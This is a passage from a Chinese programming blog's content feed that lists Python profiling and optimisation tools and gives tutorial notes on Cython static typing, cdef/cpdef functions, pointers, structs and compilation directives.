title="dstat：服务器监控。"></a>dstat：服务器监控。</h3><h3 id="gdb：复杂而又强大的工具-用来追踪代码。"><a href="#gdb：复杂而又强大的工具-用来追踪代码。" class="headerlink" title="gdb：复杂而又强大的工具,用来追踪代码。"></a>gdb：复杂而又强大的工具,用来追踪代码。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#安装 </span></div><div class="line">$ sudo apt-get install  gdb  python-dbg</div><div class="line"></div><div class="line"><span class="comment">#使用方式 </span></div><div class="line">$ gdb  -p <span class="number">1234</span>(pid)</div><div class="line">或者</div><div class="line">$ gdb python <span class="number">1234</span>(pid)</div></pre></td></tr></table></figure><hr><h2 id="可视化工具"><a href="#可视化工具" class="headerlink" title="可视化工具"></a>可视化工具</h2><h3 id="KCacheGind-pyprof2calltree：这套工具可以把cProfile输出结果转化成可视化数据图表。"><a href="#KCacheGind-pyprof2calltree：这套工具可以把cProfile输出结果转化成可视化数据图表。" class="headerlink" title="KCacheGind/pyprof2calltree：这套工具可以把cProfile输出结果转化成可视化数据图表。"></a>KCacheGind/pyprof2calltree：这套工具可以把cProfile输出结果转化成可视化数据图表。</h3><h3 id="RunSnakeRun：这个工具也可以把cProfile的输出结果可视化，还带有方块图和可排序列表。"><a href="#RunSnakeRun：这个工具也可以把cProfile的输出结果可视化，还带有方块图和可排序列表。" class="headerlink" title="RunSnakeRun：这个工具也可以把cProfile的输出结果可视化，还带有方块图和可排序列表。"></a>RunSnakeRun：这个工具也可以把cProfile的输出结果可视化，还带有方块图和可排序列表。</h3><h3 id="gprof2dot：Gprof2Dot可将多种Profiler的数据转成Graphviz可处理的图像表述。配合dot命令，即可得到不同函数所消耗的时间分析图。"><a href="#gprof2dot：Gprof2Dot可将多种Profiler的数据转成Graphviz可处理的图像表述。配合dot命令，即可得到不同函数所消耗的时间分析图。" class="headerlink" title="gprof2dot：Gprof2Dot可将多种Profiler的数据转成Graphviz可处理的图像表述。配合dot命令，即可得到不同函数所消耗的时间分析图。"></a>gprof2dot：Gprof2Dot可将多种Profiler的数据转成Graphviz可处理的图像表述。配合dot命令，即可得到不同函数所消耗的时间分析图。</h3><h3 id="vprof：也是一个不错的工具来提供交互式的分析数据可视化，他是针对文件进行执行并分析，并在浏览器中生成可视化图标。"><a href="#vprof：也是一个不错的工具来提供交互式的分析数据可视化，他是针对文件进行执行并分析，并在浏览器中生成可视化图标。" class="headerlink" title="vprof：也是一个不错的工具来提供交互式的分析数据可视化，他是针对文件进行执行并分析，并在浏览器中生成可视化图标。"></a>vprof：也是一个不错的工具来提供交互式的分析数据可视化，他是针对文件进行执行并分析，并在浏览器中生成可视化图标。</h3><h3 id="Pyflame：可直接分析当前在运行的Python进程，收集完整的Python栈格式化数据使之能生成火焰图（flame-graph）具有低开销适用于没有明确针对分析器设计的程序，只支持Linux。"><a href="#Pyflame：可直接分析当前在运行的Python进程，收集完整的Python栈格式化数据使之能生成火焰图（flame-graph）具有低开销适用于没有明确针对分析器设计的程序，只支持Linux。" class="headerlink" title="Pyflame：可直接分析当前在运行的Python进程，收集完整的Python栈格式化数据使之能生成火焰图（flame graph）具有低开销适用于没有明确针对分析器设计的程序，只支持Linux。"></a>Pyflame：可直接分析当前在运行的Python进程，收集完整的Python栈格式化数据使之能生成火焰图（flame graph）具有低开销适用于没有明确针对分析器设计的程序，只支持Linux。</h3><hr><h2 id="常见的优化工具"><a href="#常见的优化工具" class="headerlink" title="常见的优化工具"></a>常见的优化工具</h2><h3 id="PyPy：Python解释器的另一种版本，使用JIT即时编译技术进行优化。"><a href="#PyPy：Python解释器的另一种版本，使用JIT即时编译技术进行优化。" class="headerlink" title="PyPy：Python解释器的另一种版本，使用JIT即时编译技术进行优化。"></a>PyPy：Python解释器的另一种版本，使用JIT即时编译技术进行优化。</h3><h3 id="Cython：Python的超集，将Python编译成C-C-代码进行优化。"><a href="#Cython：Python的超集，将Python编译成C-C-代码进行优化。" class="headerlink" title="Cython：Python的超集，将Python编译成C/C++代码进行优化。"></a>Cython：Python的超集，将Python编译成C/C++代码进行优化。</h3><h3 id="Numba：Python的一个模块，可以控制Python解释器把函数转化为机器码，实现高性能的纯Python代码。"><a href="#Numba：Python的一个模块，可以控制Python解释器把函数转化为机器码，实现高性能的纯Python代码。" class="headerlink" title="Numba：Python的一个模块，可以控制Python解释器把函数转化为机器码，实现高性能的纯Python代码。"></a>Numba：Python的一个模块，可以控制Python解释器把函数转化为机器码，实现高性能的纯Python代码。</h3><h3 id="Parakeet：一种用Python子集为科学计算设计的运行时编译器，非常适合处理科学计算问题。"><a href="#Parakeet：一种用Python子集为科学计算设计的运行时编译器，非常适合处理科学计算问题。" class="headerlink" title="Parakeet：一种用Python子集为科学计算设计的运行时编译器，非常适合处理科学计算问题。"></a>Parakeet：一种用Python子集为科学计算设计的运行时编译器，非常适合处理科学计算问题。</h3></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第三章 深入Cython</title>
      <link href="/2017/07/17/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B7%B1%E5%85%A5Cython/"/>
      <url>/2017/07/17/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B7%B1%E5%85%A5Cython/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>深入Cython</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>本章主要关注为什么Cython能如此好的加速Python代码，归因于两个不同：</p><ul><li>1.运行时解释和提前编译</li><li>2.动态和静态类型</li></ul><h2 id="解释和编译后执行"><a href="#解释和编译后执行" class="headerlink" title="解释和编译后执行"></a>解释和编译后执行</h2><p>字节码和机器码的桥梁：Python解释器可以直接运行编译后的C代码，并且对最终用户透明。这些C代码必须编译成特殊类型的动态库，作为扩展模块，这些模块是完整的Python模块，当运行这部分扩展模块的时候，Python虚拟机不在解释字节码，而是直接运行编译后的机器码，这将节省Python解释器的时间开销。<br>这种方式大概能提升Python 10%~30%的性能，但是真正性能改进来自用静态类型替代Python的动态类型。</p><h3 id="动态类型和静态类型"><a href="#动态类型和静态类型" class="headerlink" title="动态类型和静态类型"></a>动态类型和静态类型</h3><p>静态类型通过指定变量类型，编译器将基础的操作进行优化，而动态类型获得了灵活性却将大量的时间浪费在了变量类型推断和基础操作中。</p><h3 id="静态类型定义关键字：cdef"><a href="#静态类型定义关键字：cdef" class="headerlink" title="静态类型定义关键字：cdef"></a>静态类型定义关键字：cdef</h3><p>使用C语言的变量类型，就要按照C语言的构造规则,<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">cdef int i, j, k</div><div class="line">cdef float price, margin</div><div class="line"></div><div class="line">cdef int i = <span class="number">0</span></div><div class="line">cdef long int j = <span class="number">0</span>, k = <span class="number">0</span></div><div class="line">cdef float price = <span class="number">0.0</span>, margin = <span class="number">1.0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">integrate</span><span class="params">(a, b, f)</span>:</span></div><div class="line">    cdef int i</div><div class="line">    cdef int N=<span class="number">2000</span></div><div class="line">    cdef float dx, s=<span class="number">0.0</span></div><div class="line">    dx = (b-a)/N</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</div><div class="line">        s += f(a+i*dx)</div><div class="line">    <span class="keyword">return</span> s * dx</div><div class="line"></div><div class="line"><span class="comment">#也可以使用cdef代码块</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">integrate</span><span class="params">(a, b, f)</span>:</span></div><div class="line">    cdef:</div><div class="line">        int i</div><div class="line">        int N=<span class="number">2000</span></div><div class="line">        float dx, s=<span class="number">0.0</span></div><div class="line">    <span class="comment">#...</span></div></pre></td></tr></table></figure></p><p>cdef声明对应表:<br><img src="/2017/07/17/第三章-深入Cython/1.png" alt="cdef声明对应表"></p><h3 id="Cython中的自动类型推断"><a href="#Cython中的自动类型推断" class="headerlink" title="Cython中的自动类型推断"></a>Cython中的自动类型推断</h3><p>使用cdef不是Cython的唯一的定义静态变量的方法，Cython还支持自动推断未被定义类型的函数和函数体，默认情况下，Cython只有在不会改变代码语义的情况下才会使用自动类型推断。<br>可以使用infer_types编译指令来给Cython的自动推断更好的控制，infer_types编译指令可以用在函数作用域或者全局作用域，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">cimport cython</div><div class="line"></div><div class="line"><span class="meta">@cython.infer_types(True)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">more_inference</span><span class="params">()</span>:</span></div><div class="line">    i = <span class="number">1</span></div><div class="line">    d = <span class="number">2.0</span></div><div class="line">    c = <span class="number">3</span>+<span class="number">4j</span></div><div class="line">    r = i * d + c</div><div class="line">    <span class="keyword">return</span> r</div></pre></td></tr></table></figure></p><p>当时用infer_types编译指令的时候，我们应该负责人的确定整数不会溢出，代码语义不会改变，使用它可以很轻易的测试是否改变了代码的结果，以及是否有不同的性能。</p><h3 id="Cython中的C指针"><a href="#Cython中的C指针" class="headerlink" title="Cython中的C指针"></a>Cython中的C指针</h3><p>在Cython中，我们可以使用C的语法和语义定义指针，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cdef int *p_int</div><div class="line">cdef float** pp_float = NULL</div><div class="line">cdef int *a, *b</div></pre></td></tr></table></figure></p><p>由于Python中有<em>和*</em>语法，所以Cython中指针的引用跟C语言中的语法有些不同，有下面两种引用方式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cdef double golden_ratio</div><div class="line">cdef double *p_double</div><div class="line">p_double = &amp;golden_ratio</div><div class="line"></div><div class="line"><span class="comment">#下面方式不常用</span></div><div class="line"><span class="keyword">from</span> cython cimport operator</div><div class="line"><span class="keyword">print</span> operator.dereference(p_double)</div></pre></td></tr></table></figure></p><p>另外，Cython中指针指向结构体和C语言中也不同：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#C语言用法：</span></div><div class="line">st_t *p_st = make_struct();</div><div class="line">int a_doubled = p_st-&gt;a + p_st-&gt;a;</div><div class="line"></div><div class="line"><span class="comment">#Cython用法：</span></div><div class="line">cdef st_t *p_st = make_struct()</div><div class="line">cdef int a_doubled = p_st.a + p_st.a</div></pre></td></tr></table></figure></p><h3 id="混合静态和动态类型变量"><a href="#混合静态和动态类型变量" class="headerlink" title="混合静态和动态类型变量"></a>混合静态和动态类型变量</h3><p>Cython允许静态类型和动态类型变量之间的赋值，如下面例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#今天的int类型</span></div><div class="line">cdef int a, b, c</div><div class="line"><span class="comment">#动态元祖类型</span></div><div class="line">tuple_of_ints = (a, b, c)</div></pre></td></tr></table></figure></p><p>这个简单的例子能运行是因为C语言中的int和Python中的int有明显的对应关系，如果a,b,c变量是指针，那么这个例子就不能工作，需要先将指针的应用内容放入元祖中或者采用其他策略。<br>下面是C/C++和Python的类型对应关系表:<br><img src="/2017/07/17/第三章-深入Cython/2.png" alt="C/C++和Python的类型对应关系表"></p><h3 id="int类型转换和溢出"><a href="#int类型转换和溢出" class="headerlink" title="int类型转换和溢出"></a>int类型转换和溢出</h3><p>注意：int类型的转换需要考虑整数溢出的问题，如果C类型不能代表Python的整数，运行时将会抛出OverflowError异常，我们可以设置overflowcheck和overflowcheck.fold编译指令来捕捉溢出错误</p><h3 id="str和unicode类型"><a href="#str和unicode类型" class="headerlink" title="str和unicode类型"></a>str和unicode类型</h3><p>str或unicode的类型转换到char *或std::string类型需要设置c_string_type和c_string_encoding编译指令。</p><h3 id="用Python类型声明静态变量"><a href="#用Python类型声明静态变量" class="headerlink" title="用Python类型声明静态变量"></a>用Python类型声明静态变量</h3><p>目前为止，我们已经使用cdef关键字声明C类型的静态变量，他也能够声明Python类型的静态变量，我们可以使用内置的变量类型，如list，tuple，dict，扩展的类型，如NumPy的arrays类型，和其他的许多类型。<br>但并不是所有的Python类型都能被静态声明：他们必须用C语言实现，而且Cython能访问他们的声明。Python内置的类型已经满足这些要求，静态声明他们很简单，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cdef list particles, modified_particles</div><div class="line">cdef dict names_from_particles</div><div class="line">cdef str pname</div><div class="line">cdef set unique_particles</div></pre></td></tr></table></figure></p><p>在底层，Cython使用C指针指向他们Python内置的结构体类型声明，他们能像普通的Python类型一样使用，但是仅限于他们声明的类型。<br>注意：C语言和Python的除法和取模语义不一样，会有不同的计算行为。默认情况下Cython使用Python的语法语义来计算除法和取模，当然可以使用cdivision编译指令来改变这一行为。</p><h3 id="静态类型对加速的意义"><a href="#静态类型对加速的意义" class="headerlink" title="静态类型对加速的意义"></a>静态类型对加速的意义</h3><p>Cython的一般原理：我们提供的静态信息类型越多，Cython优化的结果就越好。<br>Cython目前支持下面一些Python内置的类型静态声明：</p><ul><li>type, object</li><li>bool</li><li>complex</li><li>basestring, str, unicode, bytes, bytearray</li><li>list, tuple, dict, set, frozenset</li><li>array</li><li>slice</li><li>date, time, datetime, timedelta, tzinfo<br>更多的类型支持可能会在未来的版本实现。<br>Python有一个PyLongObjects的C级别的对象来表示任意大小的整数，Cython提供了一个适当的语言无关的方法转换C的整数和Python的整数类型，在转换过程中不可能抛出OverflowError异常。</li></ul><h3 id="引用计数和静态字符串类型"><a href="#引用计数和静态字符串类型" class="headerlink" title="引用计数和静态字符串类型"></a>引用计数和静态字符串类型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#这种赋值方式会报错</span></div><div class="line">b1 = <span class="string">b"All men are mortal."</span></div><div class="line">b2 = <span class="string">b"Socrates is a man."</span></div><div class="line">cdef char *buf = b1 + b2</div><div class="line"></div><div class="line"><span class="comment">#下面两种才行</span></div><div class="line">tmp = s1 + s2</div><div class="line">cdef char *buf = tmp</div><div class="line"></div><div class="line">cdef bytes tmp = s1 + s2</div><div class="line">cdef char *buf = tmp</div></pre></td></tr></table></figure><h2 id="Cython的三种类型函数"><a href="#Cython的三种类型函数" class="headerlink" title="Cython的三种类型函数"></a>Cython的三种类型函数</h2><p>Python的函数比C语言的函数要灵活强大的多，但是代价是比C语言慢很多，Cython支持同一个文件内C语言的函数和Python的函数相互调用。</p><h3 id="Cython中的Python函数用def关键字"><a href="#Cython中的Python函数用def关键字" class="headerlink" title="Cython中的Python函数用def关键字"></a>Cython中的Python函数用def关键字</h3><p>Cython中支持使用def关键字定义Python类型的函数，而且跟在Python的使用一样</p><h3 id="Cython中的C类型函数使用cdef关键字"><a href="#Cython中的C类型函数使用cdef关键字" class="headerlink" title="Cython中的C类型函数使用cdef关键字"></a>Cython中的C类型函数使用cdef关键字</h3><p>使用cdef关键字定义C语言类型的函数，参数和返回值都是静态类型，可以使用指针，结构体和其他C语言类型，而不会自动转到Python类型，但是却是Python语法风格如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cdef long c_fact(long n):</div><div class="line">    <span class="string">"""Computes n!"""</span></div><div class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> n * c_fact(n - <span class="number">1</span>)</div></pre></td></tr></table></figure></p><p>cdef函数在同一个源文件中可以被任何def和cdef函数调用，但是cdef函数不允许被外部的Python代码调用，由于这个限制，cdef函数通常用来作为快速辅助来帮助def函数完成任务。<br>如果我们想要在外部的Python代码使用cdef函数，我们需要用def函数包装cdef函数，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrap_c_fact</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="string">"""Computes n!"""</span></div><div class="line">    <span class="keyword">return</span> c_fact(n)</div></pre></td></tr></table></figure></p><h3 id="使用cpdef结合def和cdef函数"><a href="#使用cpdef结合def和cdef函数" class="headerlink" title="使用cpdef结合def和cdef函数"></a>使用cpdef结合def和cdef函数</h3><p>cpdef函数结合了def和def函数的特点，解决了他们的很多局限性，cpdef结合了def的可访问性和cdef的高效性，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cpdef long cp_fact(long n):</div><div class="line">    <span class="string">"""Computes n!"""</span></div><div class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> n * cp_fact(n - <span class="number">1</span>)</div></pre></td></tr></table></figure></p><p>cpdef有一个限制，由于cpdef肩负着Python和C的双重责任，他的参数和返回值类型必须是Python和C的兼容类型。任何Python类型都可以在C级别被表示，但是并不是所有的C类型都可以在Python中被表示，所以我们不能在cpdef函数中使用void、C指针或者C数组等类型作为返回值或者参数。</p><h2 id="函数和异常处理"><a href="#函数和异常处理" class="headerlink" title="函数和异常处理"></a>函数和异常处理</h2><p>def函数返回的是Python类型，如果出现异常，异常能被正确的传播出去，但是cdef和cpdef函数返回的不是Python类型，出现异常会产生警告，异常会被忽略，不会被传播出去，为了传播异常，Cython提供了except子句，允许cdef和cpdef函数产生异常时和他的调用者进行交流。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cpdef int divide_ints(int i, int j) except? -1:</div><div class="line">    <span class="keyword">return</span> i / j</div></pre></td></tr></table></figure></p><p>如果发生异常，函数会返回-1作为检查异常的哨兵，我们不用手动返回-1，Cython会自动处理这个值，这个值是任意的，可以设置成任何整数值.</p><h2 id="函数和embedsignature编译指令"><a href="#函数和embedsignature编译指令" class="headerlink" title="函数和embedsignature编译指令"></a>函数和embedsignature编译指令</h2><p>embedsignature编译指令设置为True能帮助生成默认的签名，知道参数名和函数的默认值。</p><h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><p>Cython中的类型转换规则跟C语言的类型转换规则很像。</p><h2 id="声明和使用structs、unions和enums"><a href="#声明和使用structs、unions和enums" class="headerlink" title="声明和使用structs、unions和enums"></a>声明和使用structs、unions和enums</h2><p>Cython也支持声明、创建和使用C语言的struct、union和enum类型。例子如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#C语言中声明struct和union</span></div><div class="line">struct mycpx &#123;</div><div class="line">    int a;</div><div class="line">    float b;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">union uu &#123;</div><div class="line">    int a;</div><div class="line">    short b, c;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">#Cython中声明struct和union</span></div><div class="line">cdef struct mycpx:</div><div class="line">    float real</div><div class="line">    float imag</div><div class="line"></div><div class="line">cdef union uu:</div><div class="line">    int a</div><div class="line">    short b, c</div></pre></td></tr></table></figure></p><p>也可以使用它ctypedef,定义另一种struct或者union的类型别名，然后使用cdef定义使用 ，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">ctypedef struct mycpx:</div><div class="line">    float real</div><div class="line">    float imag</div><div class="line"></div><div class="line">ctypedef union uu:</div><div class="line">    int a</div><div class="line">    short b, c</div><div class="line"></div><div class="line"><span class="comment">#几种使用方式</span></div><div class="line">cdef mycpx zz</div><div class="line">zz.real = <span class="number">3.1415</span></div><div class="line">zz.imag = <span class="number">-1.0</span></div><div class="line"></div><div class="line">cdef mycpx a = mycpx(<span class="number">3.1415</span>, <span class="number">-1.0</span>)</div><div class="line">cdef mycpx b = mycpx(real=<span class="number">2.718</span>, imag=<span class="number">1.618034</span>)</div><div class="line"></div><div class="line">cdef mycpx zz = &#123;<span class="string">'real'</span>: <span class="number">3.1415</span>, <span class="string">'imag'</span>: <span class="number">-1.0</span>&#125;</div></pre></td></tr></table></figure></p><p>嵌套struct的使用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cdef struct _inner:</div><div class="line">    int inner_a</div><div class="line"></div><div class="line">cdef struct nested:</div><div class="line">    int outer_a</div><div class="line">    _inner inner</div><div class="line"></div><div class="line">cdef nested n = &#123;<span class="string">'outer_a'</span>: <span class="number">1</span>, <span class="string">'inner'</span>: &#123;<span class="string">'inner_a'</span>: <span class="number">2</span>&#125;&#125;</div></pre></td></tr></table></figure></p><p>enum也可以使用ctypedef和cdef关键字声明使用，和struct、union类似，实例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">cdef enum PRIMARIES:</div><div class="line">    RED = <span class="number">1</span></div><div class="line">    YELLOW = <span class="number">3</span></div><div class="line">    BLUE = <span class="number">5</span></div><div class="line"></div><div class="line">cdef enum SECONDARIES:</div><div class="line">    ORANGE, GREEN, PURPLE</div><div class="line"></div><div class="line"><span class="comment">#匿名enum在定义全局整数常数时很有用</span></div><div class="line">cdef enum:</div><div class="line">    GLOBAL_SEED = <span class="number">37</span></div></pre></td></tr></table></figure></p><h2 id="使用ctypedef声明类型别名"><a href="#使用ctypedef声明类型别名" class="headerlink" title="使用ctypedef声明类型别名"></a>使用ctypedef声明类型别名</h2><p>Cython支持ctypedef关键字，他的用法和C语言的typedef声明类似，在和外部代码对接时很有用，下面是一个简单的例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ctypedef double real</div><div class="line">ctypedef long integral</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">displacement</span><span class="params">(real d0, real v0, real a, real t)</span>:</span></div><div class="line">    <span class="string">"""Calculates displacement under constant acceleration."""</span></div><div class="line">    cdef real d = d0 + (v0 * t) + (<span class="number">0.5</span> * a * t**<span class="number">2</span>)</div><div class="line">    <span class="keyword">return</span> d</div></pre></td></tr></table></figure></p><p>一个ctypedef声明必须在文件域内，不能再函数域声明。</p><h2 id="Cython的for循环和while循环"><a href="#Cython的for循环和while循环" class="headerlink" title="Cython的for循环和while循环"></a>Cython的for循环和while循环</h2><p>Cython支持无改动的Python的for循环和while循环的优化，它能够自推断类型并生成优化代码，但是并不是任何时候都会这样做，比如下面代码，n是动态的类型，Cython将不会进行C语言的加速优化，将n改为静态类型才会进行加速优化<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">n = <span class="number">100</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    <span class="comment"># ...</span></div><div class="line"></div><div class="line"><span class="comment">#加速优化</span></div><div class="line">cdef unsigned int i, n = <span class="number">100</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    <span class="comment"># ...</span></div></pre></td></tr></table></figure></p><h3 id="高效for循环指南"><a href="#高效for循环指南" class="headerlink" title="高效for循环指南"></a>高效for循环指南</h3><p>将循环变量声明为静态类型，Cython会加速优化for循环，但是如果你在循环中对列表进行索引，Cython不会检查索引是否越界。<br>当容器是list, tuple, dict等等类型时，静态的循环索引变量也会带来很大的开销，为了for循环更加高效，可以使用其他的更加高效的容器替换。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">n = len(a) - <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n):</div><div class="line">    a[i] = (a[i<span class="number">-1</span>] + a[i] + a[i+<span class="number">1</span>]) / <span class="number">3.0</span></div><div class="line"></div><div class="line"><span class="comment">#优化后</span></div><div class="line">cdef unsigned int i, n = len(a) - <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n):</div><div class="line">    a[i] = (a[i<span class="number">-1</span>] + a[i] + a[i+<span class="number">1</span>]) / <span class="number">3.0</span></div></pre></td></tr></table></figure></p><h2 id="Cython预编译"><a href="#Cython预编译" class="headerlink" title="Cython预编译"></a>Cython预编译</h2><p>Cython有一个DEF关键字创建宏，是一个编译时符号，类似于C语言的#define，DEF常数必须在编译时被解析，而且只能是简单类型，它们可以是浮点数、整数或者字符串，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">DEF E = <span class="number">2.718281828459045</span></div><div class="line">DEF PI = <span class="number">3.141592653589793</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">feynmans_jewel</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Returns e**(i*pi) + 1. Should be ~0.0"""</span></div><div class="line">    <span class="keyword">return</span> E ** (<span class="number">1j</span> * PI) + <span class="number">1.0</span></div></pre></td></tr></table></figure></p><h2 id="连接Python2和Python3的桥梁"><a href="#连接Python2和Python3的桥梁" class="headerlink" title="连接Python2和Python3的桥梁"></a>连接Python2和Python3的桥梁</h2><p>我们可以用Python2或者Python3语法编写Cython的.pyx文件，生成的C语言代码是兼容Python2和Python3的，也就是说任何Cython代码都能编译成Python2模块或者Python3模块。Cython会自动推断Python版本，也可以使用参数来指定编译版本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#指定以Python3版本编译</span></div><div class="line">$ cython <span class="number">-3</span> file.pyx</div><div class="line"><span class="comment">#指定以Python2版本编译</span></div><div class="line">$ cython <span class="number">-2</span> file.pyx</div></pre></td></tr></table></figure></p></the></excerpt>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Cython </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第二章 编译和运行Cython代码</title>
      <link href="/2017/07/03/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BC%96%E8%AF%91%E5%92%8C%E8%BF%90%E8%A1%8CCython%E4%BB%A3%E7%A0%81/"/>
      <url>/2017/07/03/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BC%96%E8%AF%91%E5%92%8C%E8%BF%90%E8%A1%8CCython%E4%BB%A3%E7%A0%81/</url>
